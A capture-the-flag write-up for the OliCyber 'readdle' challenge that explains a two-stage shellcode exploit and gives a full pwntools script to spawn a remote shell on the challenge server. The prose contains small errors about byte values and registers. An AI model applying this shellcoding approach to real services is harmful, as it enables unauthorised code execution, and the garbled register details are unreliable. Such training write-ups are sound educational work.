# URL
https://training.olicyber.it/challenges#challenge-101
# Concept
* two-stage shellcoding
* eggshell shellcoding
* register laundering
# Method of solve
* this challenge and binary tell us explicitly that it will execute the instructions we provide to it, but it's limited to 4 bytes
  * we see that in the way the program takes in user input:
```x86asm
mov edx, 4
mov esi, 0x1337000
mov edi, 0
call sym.imp.read
```
  * in the read function, the number of bytes to read is recorded in the `edx` register
  * the memory address the input is to be written to is recorded in the `esi` register
  * the FD (file descriptor) to read from is recorded in the `edi` register (`0` is stdin)
* the other important detail we get from the binary's disassembly is the end portion of the main function:
```x86asm
xor rdx, rdx
xor rdi, rdi
mov rsi, 0x1337000
jmp rsi
```
  * these xor instructions zero-out the contents of the `rdx` and `rdi` registers
  * combined with `rsi` set to the specific memory address `0x1337000` we can re-use these registers to run a second `read` system call, but instead provide 255 bytes to input (instead of 4 bytes)
  * so our 4-byte payload will be `\xb2\xff\x0f\x05`:
    * the `0xbfff` portion sets the lowest byte of `rdx` (dl) to `ff` (255)
    * the `0x0f05` portion invokes the 64-bit `syscall` instruction
* this allows us to send a second payload which contains our actual shellcode:
  * the first four bytes of the second payload must overwrite the previous payload, otherwise the new payload may become interrupted or corrupted
    * this is because the `rip` register points to the byte immediately after the end of the previous payload, but the second payload is recorded from the start of the `rdi` register
      * this means, if we don't overwrite the original payload with buffer (NOP sled), the processor will start the second payload with an offset of 4 bytes, which will cause the second payload to fail
## Pwntools
```
from pwn import *
import sys

# Settings for shellcode
context.update(arch='amd64', os='linux')

#io = process('./readdle')
io = remote('readdle.challs.olicyber.it', 10018)
# This payload is the asm instructions for
# "mov dl 255" (0xb2ff) and 64-bit "syscall" (0x0f05)
payload_one = b"\xb2\xff\x0f\x05"

assembly = shellcraft.amd64.linux.sh()

# This padding is to overwrite payload_one's
# insructions so we can provide payload_two's shellcode
padding = b"\x90\x90\x90\x90"

payload_two = asm(assembly)

io.send(payload_one)
io.send(padding + payload_two)
io.interactive()
```
